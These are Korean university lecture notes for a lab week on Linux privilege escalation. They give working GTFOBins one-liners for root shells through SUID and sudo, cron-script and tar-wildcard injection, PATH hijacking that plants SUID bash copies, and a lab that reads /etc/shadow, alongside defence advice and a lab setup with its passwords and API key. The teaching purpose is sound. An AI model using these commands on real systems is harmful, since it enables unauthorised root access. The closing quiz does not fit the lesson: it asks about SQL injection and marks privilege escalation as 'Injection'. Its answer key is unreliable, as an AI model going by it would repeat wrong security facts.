# Week 11: 권한 상승 (Linux Privilege Escalation)

## 학습 목표
- Linux 권한 모델(사용자, 그룹, 퍼미션)을 이해한다
- SUID 바이너리를 이용한 권한 상승 원리를 설명할 수 있다
- sudo 설정 오류를 통한 권한 상승 방법을 실습한다
- Cron job과 PATH 하이재킹의 위험성을 이해한다
- 커널 익스플로잇의 개념을 설명할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |

---

# Week 11: 권한 상승 (Linux Privilege Escalation)

## 학습 목표

- Linux 권한 모델(사용자, 그룹, 퍼미션)을 이해한다
- SUID 바이너리를 이용한 권한 상승 원리를 설명할 수 있다
- sudo 설정 오류를 통한 권한 상승 방법을 실습한다
- Cron job과 PATH 하이재킹의 위험성을 이해한다
- 커널 익스플로잇의 개념을 설명할 수 있다

---

## 1. Linux 권한 모델 복습

### 1.1 사용자와 권한

> **실습 목적**: Linux 시스템에서 일반 사용자 권한으로 시작하여 root 권한을 획득하는 권한 상승 기법을 실습한다
>
> **배우는 것**: SUID 바이너리, 잘못된 sudo 설정, 커널 취약점 등 권한 상승 경로를 체계적으로 탐색하는 방법을 배운다
>
> **결과 해석**: whoami 결과가 root로 바뀌거나 /etc/shadow 읽기가 가능하면 권한 상승에 성공한 것이다
>
> **실전 활용**: 침투 테스트에서 초기 접근 후 관리자 권한 획득은 공격 체인의 핵심 단계이다

```bash
# 현재 사용자 확인
whoami         # --> user
id             # --> uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

# 파일 권한 확인
ls -la /etc/passwd
# -rw-r--r-- 1 root root 1234 Mar 27 10:00 /etc/passwd
#
# 권한 필드 해석: -rw-r--r--
#   rw-  --> 소유자: 읽기+쓰기
#   r--  --> 그룹: 읽기만 가능
#   r--  --> 기타 사용자: 읽기만 가능
```

### 1.2 특수 퍼미션

| 비트 | 숫자 | 이름 | 효과 |
|------|------|------|------|
| `s` (소유자) | 4000 | SUID | 실행 시 파일 소유자 권한으로 실행 |
| `s` (그룹) | 2000 | SGID | 실행 시 파일 그룹 권한으로 실행 |
| `t` | 1000 | Sticky | 디렉토리 내 파일 삭제 시 소유자만 가능 |

**SUID가 위험한 이유:**
```
일반 실행:   user가 실행 → user 권한으로 동작
SUID 실행:   user가 실행 → root 권한으로 동작 (파일 소유자가 root일 때)
```

---

## 2. SUID 바이너리를 이용한 권한 상승

### 2.1 SUID 바이너리 찾기

> **이 명령을 왜 실행하는가?**
> SUID(Set User ID) 비트가 설정된 파일은 **실행 시 파일 소유자의 권한으로 동작**한다.
> 예: `/usr/bin/passwd`는 root 소유이고 SUID가 설정되어 있으므로, 일반 사용자가 실행해도
> root 권한으로 `/etc/shadow`를 수정할 수 있다 (패스워드 변경).
>
> 문제는 `find`, `vim`, `python3` 같은 범용 도구에 SUID가 설정되면,
> 이 도구의 "쉘 실행" 기능을 통해 **일반 사용자가 root 쉘을 획득**할 수 있다는 것이다.
>
> 따라서 침투 테스터는 `find / -perm -4000`을 실행하여 비정상 SUID 바이너리를 찾고,
> GTFOBins에서 해당 바이너리의 악용 방법을 확인한다.
>
> **검증 완료:** web 서버에서 SUID 바이너리 5개 발견 (dbus-daemon-launch-helper, Xorg.wrap, ssh-keysign, pppd, fusermount3)

```bash
# SUID가 설정된 모든 파일 검색 (검증 완료)
find / -perm -4000 -type f 2>/dev/null

# 일반적인 SUID 바이너리 (정상):
# /usr/bin/passwd      → 패스워드 변경 (shadow 파일 수정 필요)
# /usr/bin/sudo        → sudo 명령어
# /usr/bin/mount       → 파일시스템 마운트
# /usr/bin/ping        → ICMP 소켓 생성

# 위험한 SUID 바이너리 (비정상):
# /usr/bin/find        → -exec로 임의 명령 실행 가능
# /usr/bin/vim         → :!sh로 쉘 실행 가능
# /usr/bin/python3     → 파이썬으로 쉘 실행 가능
# /usr/bin/nmap        → --interactive로 쉘 가능
```

### 2.2 GTFOBins

GTFOBins(https://gtfobins.github.io)는 SUID/sudo 등으로 권한 상승이 가능한 바이너리 목록이다.

**주요 SUID 악용 예시:**

```bash
# find가 SUID인 경우
find /tmp -name "*.txt" -exec /bin/sh -p \;
# → root 쉘 획득

# vim이 SUID인 경우
vim -c ':!/bin/sh'
# → vim 내에서 root 쉘 실행

# python3이 SUID인 경우
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# → root 쉘 획득

# bash가 SUID인 경우
bash -p
# → -p 옵션: 실효 UID를 유지 (SUID 활용)

# cp가 SUID인 경우
# /etc/passwd를 수정하여 root 비밀번호 추가 가능
```

---

## 3. sudo 설정 오류

> **이 실습을 왜 하는가?**
> `sudo -l` 한 줄은 침투 테스터가 Linux 서버에서 **가장 먼저 실행**하는 명령이다.
> sudo 설정 오류(NOPASSWD:ALL, 위험한 명령 허용)는 가장 흔하고 치명적인 권한 상승 경로이다.
> 우리 실습 환경의 web 서버에도 **NOPASSWD: ALL**이 설정되어 있다 — Purple Team에서 발견한 Critical 취약점이다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 현재 사용자가 어떤 명령을 root로 실행할 수 있는지
> - vim, less, find, python3 등 "안전해 보이는" 명령으로도 root 쉘을 얻을 수 있다는 사실
> - GTFOBins(https://gtfobins.github.io)에서 sudo 우회 기법을 찾는 방법
>
> **실무 시나리오:** 실제 모의해킹에서 web 서버에 접근한 후:
> 1. `sudo -l` 실행 → "(ALL) NOPASSWD: ALL" 발견
> 2. `sudo bash` → 즉시 root 쉘 획득
> 3. 보고서에 "CRITICAL: sudo NOPASSWD ALL 설정으로 일반 사용자가 root 동일 권한 보유" 기재
>
> **검증 완료:** web 서버에서 `sudo -l` → `(ALL : ALL) ALL`, `(ALL) NOPASSWD: ALL` 확인

### 3.1 sudo 권한 확인

```bash
# 현재 사용자의 sudo 권한 확인 (검증 완료)
sudo -l

# 예시 출력:
# User user may run the following commands on web:
#     (ALL) NOPASSWD: ALL
```

### 3.2 위험한 sudo 설정 예시

```
# /etc/sudoers 파일의 위험한 설정들

# 모든 명령을 비밀번호 없이 실행 가능 (매우 위험)
user ALL=(ALL) NOPASSWD: ALL

# 특정 명령만 허용했지만 우회 가능한 경우
user ALL=(root) NOPASSWD: /usr/bin/vim
user ALL=(root) NOPASSWD: /usr/bin/less
user ALL=(root) NOPASSWD: /usr/bin/find
user ALL=(root) NOPASSWD: /usr/bin/awk
user ALL=(root) NOPASSWD: /usr/bin/python3
user ALL=(root) NOPASSWD: /usr/bin/env
```

### 3.3 sudo를 통한 권한 상승

```bash
# vim으로 root 쉘
sudo vim -c ':!/bin/sh'

# less로 root 쉘
sudo less /etc/passwd
# less 내에서 !sh 입력

# find로 root 쉘
sudo find /tmp -exec /bin/sh \;

# awk로 root 쉘
sudo awk 'BEGIN {system("/bin/sh")}'

# python3으로 root 쉘
sudo python3 -c 'import os; os.system("/bin/sh")'

# env로 root 쉘
sudo env /bin/sh

# ALL이 허용된 경우 (가장 단순)
sudo su -
sudo /bin/bash
```

---

## 4. Cron Job 악용

### 4.1 Cron Job이란?

cron은 Linux에서 예약된 작업을 주기적으로 실행하는 시스템 데몬이다.

```bash
# cron 작업 확인 방법들
crontab -l                      # 현재 사용자의 cron
sudo crontab -l                 # root의 cron
ls -la /etc/cron.d/             # 시스템 cron 디렉토리
ls -la /etc/cron.daily/         # 매일 실행되는 스크립트
cat /etc/crontab                # 시스템 crontab
```

### 4.2 Cron Job 악용 시나리오

**시나리오: root가 실행하는 스크립트에 쓰기 권한이 있는 경우**

```bash
# 1. root의 cron 작업 발견
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# 2. 스크립트 퍼미션 확인
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 234 ...  ← 모든 사용자가 쓰기 가능!

# 3. 스크립트에 리버스 쉘 추가
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh

# 4. cron이 실행되면 (최대 1분 대기)
/tmp/rootbash -p
# → root 쉘 획득
```

### 4.3 Cron 와일드카드 악용

```bash
# root cron이 다음을 실행하는 경우:
# * * * * * root cd /tmp/backup && tar czf /opt/backup.tar.gz *

# tar의 --checkpoint 옵션을 악용
echo "" > "/tmp/backup/--checkpoint=1"
echo "" > "/tmp/backup/--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /tmp/backup/shell.sh
```

---

## 5. PATH 하이재킹

### 5.1 PATH 환경 변수

```bash
# PATH 확인
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin

# 명령어 실행 시 PATH 순서대로 검색
which ls
# /usr/bin/ls
```

### 5.2 PATH 하이재킹 원리

SUID 바이너리나 root cron 스크립트가 절대 경로 없이 명령어를 실행하는 경우:

```bash
# 예: /opt/scripts/status.sh (SUID root 또는 root cron)
#!/bin/bash
echo "=== System Status ==="
date           # ← 절대 경로 없이 date 호출
ps aux         # ← 절대 경로 없이 ps 호출
```

**악용 방법:**

```bash
# 1. 가짜 명령어 생성
echo '#!/bin/bash' > /tmp/date
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/date
chmod +x /tmp/date

# 2. PATH를 조작하여 /tmp를 먼저 검색하게 함
export PATH=/tmp:$PATH

# 3. 스크립트 실행 시 /tmp/date가 실행됨
/opt/scripts/status.sh

# 4. root 쉘 획득
/tmp/rootbash -p
```

---

## 6. 커널 익스플로잇 개요

### 6.1 커널 익스플로잇이란?

Linux 커널의 취약점을 이용하여 root 권한을 획득하는 공격이다. 최후의 수단으로 사용한다.

### 6.2 유명한 커널 취약점

| 취약점 | CVE | 영향 버전 | 설명 |
|--------|-----|-----------|------|
| Dirty COW | CVE-2016-5195 | Linux < 4.8.3 | Copy-on-Write 경합 조건 |
| Dirty Pipe | CVE-2022-0847 | Linux 5.8~5.16.11 | 파이프 버퍼 덮어쓰기 |
| PwnKit | CVE-2021-4034 | polkit < 0.120 | pkexec 메모리 손상 |
| GameOver(lay) | CVE-2023-2640 | Ubuntu 커널 | OverlayFS 권한 상승 |

### 6.3 커널 버전 확인

```bash
# 커널 버전 확인
uname -r
# 예: 5.15.0-91-generic

# 전체 시스템 정보
uname -a
# Linux web 5.15.0-91-generic #101-Ubuntu SMP...

# OS 배포판 확인
cat /etc/os-release
```

> **주의**: 커널 익스플로잇은 시스템 불안정을 유발할 수 있다. 실제 침투 테스트에서는 클라이언트와 사전 협의 후에만 사용한다.

---

## 7. 실습

### 실습 환경

| 서버 | IP | 접속 정보 | 특이사항 |
|------|-----|-----------|---------|
| web | 10.20.30.80 | user:web, pw:1 | sudo NOPASSWD:ALL |

### 실습 1: web 서버 접속 및 기본 정보 수집

```bash
# web 서버 SSH 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80

# 현재 사용자 정보
whoami
# 예상 출력: user

id
# 예상 출력: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

# 커널 버전 확인
uname -r
# 예상 출력: 5.15.0-xx-generic (또는 유사)

# OS 정보
cat /etc/os-release | head -5
```

### 실습 2: SUID 바이너리 검색

```bash
# web 서버에서 SUID 바이너리 검색
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "find / -perm -4000 -type f 2>/dev/null"

# 예상 출력:
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/mount
# /usr/bin/umount
# /usr/bin/su
# /usr/bin/newgrp
# /usr/bin/chfn
# /usr/bin/chsh
# /usr/bin/gpasswd
# /usr/lib/openssh/ssh-keysign
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper

# SGID 바이너리도 검색
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "find / -perm -2000 -type f 2>/dev/null"

# 결과를 정리하고, GTFOBins에서 악용 가능한 바이너리가 있는지 확인
```

### 실습 3: sudo 권한 확인 및 악용

```bash
# sudo 권한 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S -l"

# 예상 출력:
# User user may run the following commands on web:
#     (ALL) NOPASSWD: ALL

# sudo로 root 쉘 획득
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "sudo whoami"
# 예상 출력: root

# root로 중요 파일 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "sudo cat /etc/shadow | head -3"
# 예상 출력:
# root:$6$...:19000:0:99999:7:::
# daemon:*:19000:0:99999:7:::
# bin:*:19000:0:99999:7:::
```

### 실습 4: Cron Job 확인

원격 서버에 접속하여 명령을 실행합니다.

```bash
# 시스템 crontab 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat /etc/crontab"

# root의 cron 작업 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sudo crontab -l 2>/dev/null || echo 'root cron 없음'"

# cron 디렉토리 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null"

# 쓰기 가능한 스크립트 찾기
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "find /etc/cron* -writable 2>/dev/null"
```

### 실습 5: PATH 하이재킹 시연

이 실습에서는 PATH 하이재킹의 원리를 안전하게 시연한다.

```bash
# web 서버 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80

# 1. 현재 PATH 확인
echo $PATH

# 2. 테스트용 스크립트 생성 (절대 경로 없이 ls 호출)
cat > /tmp/test_script.sh << 'SCRIPT'
#!/bin/bash
echo "=== 파일 목록 ==="
ls /tmp
SCRIPT
chmod +x /tmp/test_script.sh

# 3. 가짜 ls 생성
cat > /tmp/ls << 'FAKE'
#!/bin/bash
echo "[!] PATH 하이재킹 성공! 가짜 ls가 실행되었습니다."
echo "[!] 실제 공격에서는 여기서 악성 코드가 실행됩니다."
# 원래 ls도 실행 (정상 동작 위장)
/usr/bin/ls "$@"
FAKE
chmod +x /tmp/ls

# 4. PATH 조작
export PATH=/tmp:$PATH

# 5. 스크립트 실행 → 가짜 ls가 실행됨
/tmp/test_script.sh

# 예상 출력:
# === 파일 목록 ===
# [!] PATH 하이재킹 성공! 가짜 ls가 실행되었습니다.
# [!] 실제 공격에서는 여기서 악성 코드가 실행됩니다.
# test_script.sh  ls  ...

# 6. 정리 (실습 후 반드시)
rm /tmp/ls /tmp/test_script.sh
export PATH=$(echo $PATH | sed 's|/tmp:||')
```

### 실습 6: 종합 권한 상승 체크리스트 실행

파일 시스템을 검색하여 보안 관련 항목을 찾습니다.

```bash
# web 서버에서 한 번에 체크하는 스크립트
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CHECK'  # 비밀번호 자동입력 SSH
echo "===== 1. 현재 사용자 ====="
whoami && id

echo ""
echo "===== 2. 커널 버전 ====="
uname -r                                               # 커널/시스템 정보

echo ""
echo "===== 3. sudo 권한 ====="
echo 1 | sudo -S -l 2>/dev/null

echo ""
echo "===== 4. SUID 바이너리 ====="
find / -perm -4000 -type f 2>/dev/null                 # 퍼미션 기준 파일 검색

echo ""
echo "===== 5. 쓰기 가능한 /etc 파일 ====="
find /etc -writable -type f 2>/dev/null | head -10     # 유형 기준 파일 검색

echo ""
echo "===== 6. Cron Jobs ====="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null

echo ""
echo "===== 7. 실행 중인 프로세스 (root) ====="
ps aux | grep "^root" | head -10                       # 프로세스 목록 조회

echo ""
echo "===== 8. 네트워크 서비스 ====="
ss -tlnp 2>/dev/null | head -10                        # 소켓 상태: TCP
CHECK
```

---

## 8. 방어 방법

| 공격 벡터 | 방어 방법 |
|-----------|-----------|
| SUID 남용 | 불필요한 SUID 제거, 정기 감사 |
| sudo 오설정 | 최소 권한 원칙, NOPASSWD 제한 |
| Cron 악용 | 스크립트 퍼미션 제한 (750), 절대 경로 사용 |
| PATH 하이재킹 | 스크립트에서 절대 경로 사용 |
| 커널 익스플로잇 | 정기적 커널 업데이트 |

---

## 9. 실습 과제

1. **SUID 감사 보고서**: web 서버의 SUID 바이너리 목록을 수집하고, GTFOBins를 참조하여 악용 가능한 바이너리를 분류하라.
2. **권한 상승 경로 문서화**: web 서버에서 일반 사용자(user)가 root 권한을 획득할 수 있는 모든 경로를 나열하라.
3. **방어 제안서**: 발견된 각 취약점에 대한 구체적인 수정 방법을 제시하라.

---

## 10. 핵심 정리

- 권한 상승은 침투 테스트에서 초기 접근 후 가장 중요한 단계이다
- SUID, sudo, cron, PATH 순서로 체계적으로 점검한다
- `sudo -l`은 가장 먼저 확인해야 할 명령어이다
- 모든 공격의 방어는 **최소 권한 원칙**에서 시작한다

**다음 주 예고**: Week 12에서는 권한 상승 후 지속성을 확보하고 흔적을 제거하는 기법을 학습한다.

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** 이 공격 기법이 OWASP Top 10에서 분류되는 카테고리는?
- (a) Broken Access Control(A01)  (b) **Injection(A03)**  (c) Cryptographic Failures(A02)  (d) SSRF(A10)

**Q2.** 공격자가 가장 먼저 실행하는 정찰 활동은?
- (a) 랜섬웨어 배포  (b) **포트 스캔 및 서비스 핑거프린팅**  (c) DDoS 공격  (d) 방화벽 비활성화

**Q3.** SQLi에서 '--'의 역할은?
- (a) 문자열 연결  (b) **SQL 주석 (이후 쿼리 무시)**  (c) 변수 선언  (d) 함수 호출

**Q4.** MITRE ATT&CK에서 이 기법의 전술(Tactic)은?
- (a) Impact만  (b) **해당 전술 ID 확인 필요**  (c) 모든 전술  (d) 해당 없음

**Q5.** 방어자가 이 공격을 탐지하기 위해 확인해야 하는 로그는?
- (a) CPU 사용률만  (b) **SIEM 경보 + 해당 서비스 로그**  (c) 디스크 용량만  (d) 네트워크 대역폭만

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
